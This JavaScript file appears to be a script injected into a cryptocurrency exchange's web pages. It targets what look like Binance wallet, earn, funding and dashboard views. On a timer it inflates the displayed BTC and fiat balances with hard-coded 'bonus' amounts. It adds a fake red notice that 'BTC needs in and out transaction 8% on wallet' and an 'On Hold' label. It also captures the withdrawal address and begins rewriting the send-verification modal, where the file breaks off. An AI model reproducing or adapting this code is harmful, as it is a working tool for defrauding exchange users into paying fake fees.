

//=================================================================> CHANGE VALUES HERE <============================================
//=================================================================> CHANGE VALUES HERE <============================================
const TEXT_UNDER_ESTIMATED_BALANCE = 'On Hold'
const BONUCE_WALLET = {
	ESTIMATED_BALANCE: 102.3,
	SPORT: 1.234,
	FIAT: 0.2345,
	FIAT_AND_SPORT: 2.1234, // fiat + sport
	FUNDING: 0.0012345,
	// BITCOIN
	TOTAL_BTC: 2.2313,
	AVAILABLE_BTC: 1.3124,
	ORDER_BTC: 1.2345,
}
//==============> EARN PAGE BALANCES
let bonuceBalance = {
	estTotalBtc: 0.5,
	estimatedPositionsBtc: 0.3,
	totalProfitBtc: 0.1,
	lastDayProfitBtc: 0.1,
}
//=================================================================> CHANGE VALUES HERE <============================================
//=================================================================> CHANGE VALUES HERE <============================================


















let userBalance = {
	estTotalBtc: null,
	estimatedPositionsBtc: null,
	totalProfitBtc: null,
	lastDayProfitBtc: null,
}


// sums
bonuceBalance.sportBtc = bonuceBalance.sportBtc + bonuceBalance.totalBtc // sport Btc + Tabel Btc
bonuceBalance.fiatAndSportBtc = bonuceBalance.fiatBtc + bonuceBalance.sportBtc // Fiat + Sport
bonuceBalance.estimatedBalanceBtc = bonuceBalance.estimatedBalanceBtc + bonuceBalance.fiatAndSportBtc // Esistemated Balance



let USER_WALLET = {
	ESTIMATED_BALANCE: null,
	SPORT: null,
	FIAT: null,
	FIAT_AND_SPORT: null,
	//BTC
	TOTAL_BTC: null,
	AVAILABLE_BTC: null,
	ORDER_BTC: null,
}




const INTERVAL_LENGTH = 200;

setTimeout(() => {
	setToLocalStorage(userBalance, 'userBalance')
	setToLocalStorage(bonuceBalance, 'bonuceBalance')
}, 10)

setInterval(() => {
	getBtcCurrency()
	getCurrencyType()
	checkUrl()
}, INTERVAL_LENGTH)


function checkUrl() {
	let currentUrl = document.URL
	if (currentUrl.includes('wallet/account/overview')) {
		overview()
		check_aded_texts_color()
		ad_text_on_estimated_balance()
	} else if (currentUrl.includes('wallet/account/main')) {
		fiatAndSport()
		check_aded_texts_color()
		ad_text_on_estimated_balance()
	} else if (currentUrl.includes('dashboard')) {
		dashboard()
		check_aded_texts_color()
		ad_text_on_estimated_balance()
	} else if (currentUrl.includes('wallet/account/margin')) {
		
	} else if (currentUrl.includes('wallet/funding')) {
		funding()
	} else if (currentUrl.includes('wallet/account/earn')) {
		earn()
	} else if (currentUrl.includes('wallet/account/payment/send')) {
		//change_verifikation_modal()
	}
}

function getCurrencyType() {
	let currencyTypeElement = document.getElementById('header_menu_current_fiat')
	if (currencyTypeElement) {
		currencyType = currencyTypeElement.textContent
	}
}



//---------------------------------------------> MAIN CONTROLLER END  <---------------------------------------------



//---------------------------------------------> LOCAL STORAGE START <---------------------------------------------
function setToLocalStorage(object, name) {
	localStorage.setItem(name, JSON.stringify(object));
}



function getFromLocalStorage() {
	let bonuceBitcoin = JSON.parse(localStorage.getItem('bonuceBitcoin'));
	bitcoinWallet.userDistributedCoin = userDistributedBitcoin

}



async function getIpAdress() {
	if (userData == null) {
		let res = await fetch('https://api.db-ip.com/v2/free/self');
		let data = await res.json();
		if (data.ipAddress.length > 0) {
			userData = data

		}
	}
}



//---------------------------------------------> ASSET FUNCTIONS START <---------------------------------------------


function BINANCE_CRIPTO(element, value_name) {
	const string = element.textContent
	const value = Number(string.replace(/[^0-9-.]/g, ''))
	const back_text = string.split(value)[string.split(value).length - 1]
	if (back_text.includes('BTC') || back_text.length == 0) {
		if (USER_WALLET[value_name] == null) USER_WALLET[value_name] = value
		if (value < USER_WALLET[value_name] + BONUCE_WALLET[value_name]) {
			element.innerHTML = (USER_WALLET[value_name] + BONUCE_WALLET[value_name]).toFixed(8) + back_text
		}
	}
}


function BINANCE_VALUTE(element, value_name, currency_type) {
	const string = element.textContent
	const value = Number(string.replace(/[^0-9-,-.]/g, ''))
	if (USER_WALLET[value_name] == null && value >= 0) USER_WALLET[value_name] = value
	let currency = null
	if (symbols.filter(s => s.symbol == currency_type).length > 0) { currency = symbols.filter(s => s.symbol == currency_type) } else {
		currency = symbols.filter(s => s.valute == currency_type)
	}
	if (currency) {
		const btcCurrency = JSON.parse(localStorage.getItem('btcCurrencys'))[currency[0].valute]
		const btc_value = BONUCE_WALLET[value_name] + USER_WALLET[value_name]
		const valute_value = btc_value * btcCurrency.last
		if (value < BONUCE_WALLET[value_name] + USER_WALLET[value_name]) {
			element.innerHTML = currency[0].symbol + valute_value.toFixed(2)
		}
	}

}



function xxx(element, valueName, substring) {
	if (element) {
		const string = element.textContent
		const text = string.replace(/[0-9-,-.]/g, '|')
		const value = string.replace(/[^0-9-,-.]/g, '')
		const frontText = text.split('|')[0]
		const backText = text.split('|')[value.length]
		const number = Number(value)
		const bonuceBalance = JSON.parse(localStorage.getItem('bonuceBalance'))
		const userBalance = JSON.parse(localStorage.getItem('userBalance'))
		const userValue = userBalance[valueName]
		const bonuceValue = bonuceBalance[valueName]
		if (backText.includes('BTC') || backText.length == 0 && number >= 0) {
			if (userValue === null && number >= 0) {
				setToLocalStorage({ ...userBalance, [valueName]: number }, 'userBalance')
			}
			const sum = userValue + bonuceValue
			if (number < sum) {
				element.innerHTML = frontText + sum.toFixed(substring) + backText
			}
			return true
		} else {
			return false
		}
	}
}


function demiOrigin(element, userValueName, bonuceValueName, substring) {
	if (element) {
		const string = element.textContent
		const text = string.replace(/[0-9-,-.]/g, '|')
		const value = string.replace(/[^0-9-,-.]/g, '')
		const frontText = text.split('|')[0]
		const backText = text.split('|')[value.length]
		const number = Number(value)
		const bonuceBalance = JSON.parse(localStorage.getItem('bonuceBalance'))
		const userBalance = JSON.parse(localStorage.getItem('userBalance'))
		const userValue = userBalance[userValueName]
		const bonuceValue = bonuceBalance[bonuceValueName]
		if (backText.includes('BTC') || backText.length == 0 && number >= 0) {
			if (userValue === null && number >= 0) {
				setToLocalStorage({ ...userBalance, [userValueName]: number }, 'userBalance')
			}
			const sum = userValue + bonuceValue
			if (number < sum) {
				element.innerHTML = frontText + sum.toFixed(substring) + backText
			}
			return true
		} else {
			return false
		}
	}
}

function demiOrigin2(element, userValueName, bonuceValueName, substring, currencyType) {
	if (element) {
		const string = element.textContent
		const value = string.replace(/[^0-9-,-.]/g, '')
		const number = Number(value)
		const bonuceBalance = JSON.parse(localStorage.getItem('bonuceBalance'))
		const userBalance = JSON.parse(localStorage.getItem('userBalance'))
		const btcCurrency = JSON.parse(localStorage.getItem('btcCurrencys'))[currencyType]
		const frontText = symbols.find(symbol => symbol.valute === btcCurrency.symbol)
		const finalBtc = bonuceBalance[bonuceValueName] + userBalance[userValueName]
		const finalBtcValuePerValute = btcCurrency.last * finalBtc
		if (number != finalBtcValuePerValute) {
			element.innerHTML = frontText.symbol + finalBtcValuePerValute.toFixed(substring)
		}
	}
}




function checkElementText(element) {
	if (element) {
		const string = element.textContent
		const text = string.replace(/[0-9-,-.]/g, '|')
		const value = string.replace(/[^0-9-,-.]/g, '')
		const frontText = text.split('|')[0]
		const backText = text.split('|')[value.length]
		const number = Number(value)
		return backText
	}
}




function check_aded_texts_color() {
	const text = document.getElementById('ad_text')
	const text2 = document.getElementById('ad_text2')
	if(text) {
		const element = document.querySelector('#header_menu_current_theme')
		if(element) {
			if(element.classList.contains('css-5dhyy8')) {
				text.style.color = 'rgb(246 70 93)'
				if(text2) text2.style.color = 'rgb(246 70 93)'
			}
			if(element.classList.contains('css-lwheey')) {
				text.style.color = '#rgb(246 70 93)'
				if(text2) text2.style.color = 'rgb(246 70 93)'
			} 
		}
	}
}




//---------------------------------------------> ASSET FUNCTIONS END <---------------------------------------------


function ad_text_on_estimated_balance() {
	let estimated_balance_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1wgcrop > div > div.css-lizs4h > div.css-1dmlz7j > div.css-15rqosy > div > div > div.css-1x0mdq > div > div')
	if (estimated_balance_element) estimated_balance_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-7faxdv > div > div.css-79bm7p > div.css-1dmlz7j > div.css-9gz05b > div > div > div.css-1x0mdq > div > div')
	if (estimated_balance_element) changeTexts.innerHTML = `Estimated Balance <div  style="color:rgb(252 213 53);padding-top:10px; font-weight: 400; font-size: 14px">${TEXT_UNDER_ESTIMATED_BALANCE}</div>`
}



function dashboard() {
	let cripto_element = document.getElementById('balance-text')
	if (cripto_element) {
		BINANCE_CRIPTO(cripto_element, 'ESTIMATED_BALANCE')
		if (!cripto_element.textContent.includes('-')) {
			let add_text_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1h690ep > div > div.css-116bt5r > div.css-1yd01b8 > div.css-16vu25q > div > div.css-1x0mdq')
			if(!add_text_element) add_text_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1h690ep > div > div.css-116bt5r > div.css-1yd01b8 > div.css-16vu25q > div > div.css-1x0mdq')
			let text_element = document.getElementById('ad_text')
			const text = document.createElement('div')
			text.id ='ad_text'
			text.style.fontSize = '17px'
			text.style.color = 'rgb(246 70 93)'
			text.textContent = 'BTC needs in and out transaction 8% on wallet'
			text.style.paddingRight = '100px'
			if (add_text_element && !text_element) add_text_element.appendChild(text);
		}
	} 

	let valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1h690ep > div > div.css-116bt5r > div.css-1yd01b8 > div.css-16vu25q > div > div.css-ess6bf > div.css-1c8slgq > div')
	if (valute_element) BINANCE_VALUTE(valute_element, 'ESTIMATED_BALANCE', currencyType)
}


function overview() {
	let cripto_element = document.getElementById('balance-text')
	if (cripto_element) {
		BINANCE_CRIPTO(cripto_element, 'ESTIMATED_BALANCE')
		if (!cripto_element.textContent.includes('-')) {
			let add_text_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1wgcrop > div > div.css-lizs4h > div.css-1dmlz7j > div.css-15rqosy > div.css-1pysja1 > div > div.css-1x0mdq')
			if(!add_text_element) add_text_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-7faxdv > div > div.css-79bm7p > div.css-1dmlz7j > div.css-9gz05b > div > div > div.css-1x0mdq')
			let text_element = document.getElementById('ad_text')
			const text = document.createElement('div')
			text.id ='ad_text'
			text.style.fontSize = '17px'
			text.style.color = 'rgb(246 70 93)'
			text.style.paddingRight = '100px'
			text.textContent = 'BTC needs in and out transaction 8% on wallet'
			if (add_text_element && !text_element) add_text_element.appendChild(text);
		}
	} 

	let valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-7faxdv > div > div.css-79bm7p > div.css-1dmlz7j > div.css-9gz05b > div > div > div.css-ess6bf > div.css-1c8slgq > div')
	if (!valute_element) valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1wgcrop > div > div.css-lizs4h > div.css-1dmlz7j > div.css-15rqosy > div > div > div.css-ess6bf > div.css-1c8slgq > div')
	if (valute_element) BINANCE_VALUTE(valute_element, 'ESTIMATED_BALANCE', currencyType)



	let cripto_element_fiat_and_sport = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1wgcrop > div > div.css-lizs4h > div.css-1dmlz7j > div.css-1eozghb > div.css-vurnku > div > div:nth-child(1) > div > div > div.css-10nf7hq > div > div > div')
	if (!cripto_element_fiat_and_sport) cripto_element_fiat_and_sport = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-7faxdv > div > div.css-79bm7p > div.css-1dmlz7j > div.css-1eozghb > div.css-vurnku > div > div:nth-child(1) > div > div > div.css-10nf7hq > div > div > div')
	if (cripto_element_fiat_and_sport) BINANCE_CRIPTO(cripto_element_fiat_and_sport, 'FIAT_AND_SPORT')

	let cripto_element_funding = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1wgcrop > div > div.css-lizs4h > div.css-1dmlz7j > div.css-1eozghb > div.css-vurnku > div > div:nth-child(2) > div > div > div.css-10nf7hq > div > div > div')
	if (!cripto_element_funding) cripto_element_funding = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-7faxdv > div > div.css-79bm7p > div.css-1dmlz7j > div.css-1eozghb > div.css-vurnku > div > div:nth-child(2) > div > div > div.css-10nf7hq > div > div > div')
	if (cripto_element_funding) BINANCE_CRIPTO(cripto_element_funding, 'FUNDING')

}




function fiatAndSport() {
	// ESISTEMATED
	let cripto_element = document.getElementById('balance-text')
	if (cripto_element) {
		BINANCE_CRIPTO(cripto_element, 'ESTIMATED_BALANCE')
		if (!cripto_element.textContent.includes('-')) {
			let add_text_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-1i3ug4i > div > div.css-19dexaq > div > div.css-knkq2t > div.css-1x0mdq')
			if(!add_text_element) add_text_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1a6xh0b > div > div.css-1hwut0k > div > div.css-knkq2t > div.css-1x0mdq')
			let text_element = document.getElementById('ad_text')
			const text = document.createElement('span')
			text.id ='ad_text'
			text.style.fontSize = '17px'
			text.style.color = 'rgb(246 70 93)'
			text.style.paddingRight = '100px'
		
			text.textContent = 'BTC needs in and out transaction 8% on wallet'
			if (add_text_element && !text_element) add_text_element.appendChild(text);
		}
	} 
	let valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-6bew7f > div > div.css-1pysja1 > div > div.css-knkq2t > div.css-ess6bf > div.css-1c8slgq > div')
	if (!valute_element) valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1yahbf4 > div > div.css-1pysja1 > div > div.css-knkq2t > div.css-ess6bf > div.css-1c8slgq > div')

	if (!valute_element) valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1a6xh0b > div > div.css-1hwut0k > div > div.css-knkq2t > div.css-ess6bf > div.css-1c8slgq > div')
	if (!valute_element) valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-1i3ug4i > div > div.css-19dexaq > div > div.css-knkq2t > div.css-ess6bf > div.css-1c8slgq > div')
	
	if (valute_element) BINANCE_VALUTE(valute_element, 'ESTIMATED_BALANCE', currencyType)
	// SPORT
	let cripto_element_sport = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-6bew7f > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-1iivh6i > div.css-xsje34')
	if (!cripto_element_sport) cripto_element_sport = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1yahbf4 > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-1iivh6i > div.css-1md80e3')
	
	if (!cripto_element_sport) cripto_element_sport = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-1i3ug4i > div > div.css-19dexaq > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-1iivh6i > div.css-xsje34')
	if (!cripto_element_sport) cripto_element_sport = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1a6xh0b > div > div.css-1hwut0k > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-1iivh6i > div.css-1md80e3')
	if (cripto_element_sport) BINANCE_CRIPTO(cripto_element_sport, 'SPORT')

	let valute_element_spot = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-6bew7f > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-1cukg4k')
	if (!valute_element_spot) valute_element_spot = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1yahbf4 > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-dfmt6t')

	if (!valute_element_spot) valute_element_spot = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-1i3ug4i > div > div.css-19dexaq > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-1cukg4k')
	if (!valute_element_spot) valute_element_spot = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1a6xh0b > div > div.css-1hwut0k > div > div.css-1is1v4y > div:nth-child(1) > div.css-fcqrul > div.css-dfmt6t')
	if (valute_element_spot) BINANCE_VALUTE(valute_element_spot, 'SPORT', currencyType)
	//FIAT
	let cripto_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-6bew7f > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-1iivh6i > div.css-xsje34')
	if (!cripto_element_fiat) cripto_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1yahbf4 > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-1iivh6i > div.css-1md80e3')
	if (!cripto_element_fiat) cripto_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-1i3ug4i > div > div.css-19dexaq > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-1iivh6i > div.css-xsje34')
	if (!cripto_element_fiat) cripto_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1a6xh0b > div > div.css-1hwut0k > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-1iivh6i > div.css-1md80e3')
	if (cripto_element_fiat) BINANCE_CRIPTO(cripto_element_fiat, 'FIAT')

	let valute_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-6bew7f > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-1cukg4k')
	if (!valute_element_fiat) valute_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1yahbf4 > div > div.css-1pysja1 > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-dfmt6t')

	if (!valute_element_fiat) valute_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-1s52m11 > div.css-uliqdc > div.css-1i3ug4i > div > div.css-19dexaq > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-1cukg4k')
	if (!valute_element_fiat) valute_element_fiat = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-xeilck > div.css-uliqdc > div.css-1a6xh0b > div > div.css-1hwut0k > div > div.css-1is1v4y > div:nth-child(2) > div.css-fcqrul > div.css-dfmt6t')

	if (valute_element_fiat) BINANCE_VALUTE(valute_element_fiat, 'FIAT', currencyType)
	//BITCOIN
	changeBtc('css-18yjlh6', 'css-s43sbi')
}



function funding() {
	let cripto_element = document.getElementById('balance-text')
	if (cripto_element) BINANCE_CRIPTO(cripto_element, 'FUNDING')
	let valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-enaeko > div.css-1i3ug4i > div > div.css-19dexaq > div > div > div > div.css-ess6bf > div.css-1c8slgq > div')
	if (!valute_element) valute_element = document.querySelector('#__APP > div.css-tq0shg > main > main > div.css-1wr4jig > div.css-i8fxce > div.css-1a6xh0b > div > div.css-1hwut0k > div > div > div > div.css-ess6bf > div.css-1c8slgq > div')
	if (valute_element) BINANCE_VALUTE(valute_element, 'FUNDING', currencyType)
}


function earn() {
	let estTotalBtcBlocks = document.getElementsByClassName('css-wuyj29')
	if (estTotalBtcBlocks.length > 0) {
		let estTotalBtcBlock = estTotalBtcBlocks[0]
		let estTotalBtcBtc = estTotalBtcBlock.getElementsByTagName('div')[0]
		let estTotalBtcPerValute = estTotalBtcBlock.getElementsByTagName('div')[1]

		demiOrigin(estTotalBtcBtc, 'estTotalBtc', 'estTotalBtc', 8)
		demiOrigin2(estTotalBtcPerValute, 'estTotalBtc', 'estTotalBtc', 2, currencyType)

		//BLOCKS

		let panelBlocks = document.getElementsByClassName('css-uliqdc')
		let blockNames = document.getElementsByClassName('active css-1vdap64')
		if (blockNames.length == 0) {
			blockNames = document.getElementsByClassName('active css-1ed51nl')
		}
		console.log(blockNames)
		if (panelBlocks && blockNames.length > 0) {
			let blockName = blockNames[0].textContent
			let estimatedPositionBlock = panelBlocks[0]
			let lastDayProfitBlock = panelBlocks[2]
			let totalProfitBtcBlock = panelBlocks[1]

			if (blockName == 'Staking') {
				estimatedPositionBlock = panelBlocks[4]
				lastDayProfitBlock = panelBlocks[5]
			} else if (blockName == 'Launchpad') {
				estimatedPositionBlock = panelBlocks[6]
				lastDayProfitBlock = panelBlocks[7]
			} else if (blockName == 'Liquid Swap') {
				estimatedPositionBlock = panelBlocks[8]
				lastDayProfitBlock = panelBlocks[9]
			} else if (blockName == 'Dual Investment') {
				estimatedPositionBlock = panelBlocks[10]
			} else if (blockName == 'Pool Savings') {
				estimatedPositionBlock = panelBlocks[11]
				lastDayProfitBlock = panelBlocks[12]
			}

			//ESISTEMATED POSITION
			let estimatedPositionsBtc = estimatedPositionBlock.getElementsByTagName('div')[1]
			demiOrigin(estimatedPositionsBtc, 'estimatedPositionsBtc', 'estimatedPositionsBtc', 8)
			let eestimatedPositionsBtcPerValute = estimatedPositionBlock.getElementsByTagName('div')[2]
			demiOrigin2(eestimatedPositionsBtcPerValute, 'estimatedPositionsBtc', 'estimatedPositionsBtc', 2, currencyType)

			//LAST DAY PROFIT
			let lastDayProfitBtc = lastDayProfitBlock.getElementsByTagName('div')[1]
			demiOrigin(lastDayProfitBtc, 'lastDayProfitBtc', 'lastDayProfitBtc', 8)
			let lastDayProfitBtcPerValute = lastDayProfitBlock.getElementsByTagName('div')[2]
			demiOrigin2(lastDayProfitBtcPerValute, 'lastDayProfitBtc', 'lastDayProfitBtc', 2, currencyType)

			//LAST DAY PROFIT
			let totalProfitBtc = totalProfitBtcBlock.getElementsByTagName('div')[1]
			demiOrigin(totalProfitBtc, 'totalProfitBtc', 'totalProfitBtc', 8)
			let totalProfitBtcPerValute = totalProfitBtcBlock.getElementsByTagName('div')[2]
			demiOrigin2(totalProfitBtcPerValute, 'totalProfitBtc', 'totalProfitBtc', 2, currencyType)
		}
	}

}




function changeBtc(lightClassname, darkClassname) {
	let criptoNames = document.getElementsByClassName(lightClassname)
	if (criptoNames.length == 0) {
		criptoNames = document.getElementsByClassName(darkClassname)
	}
	let targetNameElement = null
	for (let i = 0; i < criptoNames.length; i++) {
		if (criptoNames[i].textContent.includes('BTC')) {
			targetNameElement = criptoNames[i]
			
		}
	}
	if (targetNameElement) {
		targetPerent = targetNameElement.parentElement.parentElement.parentElement.parentElement.parentElement

		const ad_text = document.getElementById('ad_text2')
		const text = document.createElement('div')
		text.id ='ad_text2'
		text.style.paddingLeft = '50px'
		text.style.color = 'rgb(246 70 93)'
		text.textContent = 'BTC needs in and out transaction 8% on wallet'

		if(!ad_text && targetPerent) targetPerent.parentElement.appendChild(text)
		
		let totalBtc = targetPerent.getElementsByTagName('div')[9]
		let availableBtc = targetPerent.getElementsByTagName('div')[11]
		let inOrderBtc = targetPerent.getElementsByTagName('div')[13]
		BINANCE_CRIPTO(totalBtc, 'TOTAL_BTC')
		BINANCE_CRIPTO(availableBtc, 'AVAILABLE_BTC')
		BINANCE_CRIPTO(inOrderBtc, 'ORDER_BTC')
		let btcAndBtcPerValute = targetPerent.getElementsByClassName('css-vurnku')[0].getElementsByTagName('div')
		let targetBtcAndValute = targetPerent.getElementsByClassName('css-vurnku')[0]
		let lightelements = targetPerent.getElementsByClassName('css-1j8vrhq')
		if (lightelements.length != 0) {
			if (btcAndBtcPerValute.length == 1) {
				targetBtcAndValute.innerHTML = '<div data-bn-type="text" class="css-174z7u">0.00000000</div><div data-bn-type="text" class="css-77wl0e">≈ $0.00000000</div>'
			}
		} else {
			if (btcAndBtcPerValute.length == 1) {
				targetBtcAndValute.innerHTML = '<div data-bn-type="text" class="css-16zfqrt">0.00000000</div><div data-bn-type="text" class="css-6u02o9">≈ $0.00000000</div>'
			}
		}
		let EquivalBtc = btcAndBtcPerValute[0]
		let EquivalBtcPerUsd = btcAndBtcPerValute[1]
		if (lightelements.length != 0) {
			EquivalBtc.classList.remove("css-174z7u");
			EquivalBtcPerUsd.classList.remove('css-77wl0e')

			EquivalBtc.classList.add("css-16zfqrt");
			EquivalBtcPerUsd.classList.add('css-6u02o9')
		} else {
			EquivalBtc.classList.remove("css-16zfqrt");
			EquivalBtcPerUsd.classList.remove('css-6u02o9')

			EquivalBtc.classList.add("css-174z7u");
			EquivalBtcPerUsd.classList.add('css-77wl0e')
		}
		BINANCE_CRIPTO(EquivalBtc, 'TOTAL_BTC')
		BINANCE_VALUTE(EquivalBtcPerUsd, 'TOTAL_BTC', currencyType)
		let btcModalBlock = document.getElementsByClassName('css-enhan1')
		if (btcModalBlock.length > 0) {
			let btc = btcModalBlock[0].getElementsByTagName('div')[0]
			let btcPerValute = btcModalBlock[0].getElementsByTagName('div')[1]
			let isBtc = demiOrigin(btc, 'totalBtc', 'totalBtc', 8)
			if (isBtc) {
				BINANCE_CRIPTO(btcPerValute, 'TOTAL_BTC')
			}
		}

	}
}







function change_verifikation_modal() {
	let submit_button = document.querySelector('#__APP > div.css-bz0qr3 > div.css-1wr4jig > div.css-w99bqi > div > div > div > div.css-1ntkiwo > div > div.css-gnqbje > div > form > div.css-14d3yvj > button')
	if (!submit_button) submit_button = document.querySelector('#__APP > div.css-18cedma > div.css-1wr4jig > div.css-fedlu2 > div > div > div > div.css-1ntkiwo > div > div.css-gnqbje > div > form > div.css-14d3yvj > button')
	if (submit_button) {
		submit_button.addEventListener('click', check_verifikation_modal_loaded)
	}
}


let IS_MODAL_CHANGED = false
function check_verifikation_modal_loaded() {

	let adress_type = null
	let adress_buttons_container = document.querySelector('#__APP > div.css-18cedma > div.css-1wr4jig > div.css-fedlu2 > div > div > div > div.css-1ntkiwo > div > div.css-gnqbje > div > form')
	if (!adress_buttons_container) adress_buttons_container = document.querySelector('#__APP > div.css-bz0qr3 > div.css-1wr4jig > div.css-w99bqi > div > div > div > div.css-1ntkiwo > div > div.css-gnqbje > div > form')
	const adress_buttons = adress_buttons_container.getElementsByTagName('button')
	for (let i = 0; i < adress_buttons.length; i++) {
		if (
			adress_buttons[i].classList.contains('css-1dmwwyv') ||
			adress_buttons[i].classList.contains('css-o812r2') ||
			adress_buttons[i].classList.contains('css-1ygwd47') ||
			adress_buttons[i].classList.contains('css-37refg')
		) adress_type = adress_buttons[i].textContent.trim()
	}

	let adress = null
	let adress_input_container = document.querySelector('#__APP > div.css-bz0qr3 > div.css-1wr4jig > div.css-w99bqi > div > div > div > div.css-1ntkiwo > div > div.css-gnqbje > div > form > div.css-14d3yvj > div > div')
	if (!adress_input_container) adress_input_container = document.querySelector('#__APP > div.css-18cedma > div.css-1wr4jig > div.css-fedlu2 > div > div > div > div.css-1ntkiwo > div > div.css-gnqbje > div > form > div.css-14d3yvj > div')
	const adress_input = adress_input_container.getElementsByTagName('input')[adress_input_container.getElementsByTagName('input').length - 1]
	adress = adress_input.value



	setInterval(() => {
		let theme = 'light'
		let modal_body = document.querySelector('body > div.css-1u2pn8e > div.css-da3eqf > div > div')
		if (!modal_body) theme = 'dark', modal_body = document.querySelector('body > div.css-1u2pn8e > div.css-s089v0 > div > div')
		if (modal_body && !IS_MODAL_CHANGED) change_verifikation_modal_content(theme, modal_body, adress_type, adress), IS_MODAL_CHANGED = true
	}, 250)
}

function change_verifikation_modal_content(theme, modal_body, adress_type, adress) {

	const body = document.querySelector('body')
	const modal = document.createElement('div')
	body.appendChild

	let title_element = modal_body.getElementsByTagName('div')[0]
	let text_element = modal_body.getElementsByTagName('div')[1]
	let allow_button = modal_body.getElementsByTagName('div')[2].getElementsByTagName('button')

	let svg = document.createElement('div')
	if (theme == 'light') {
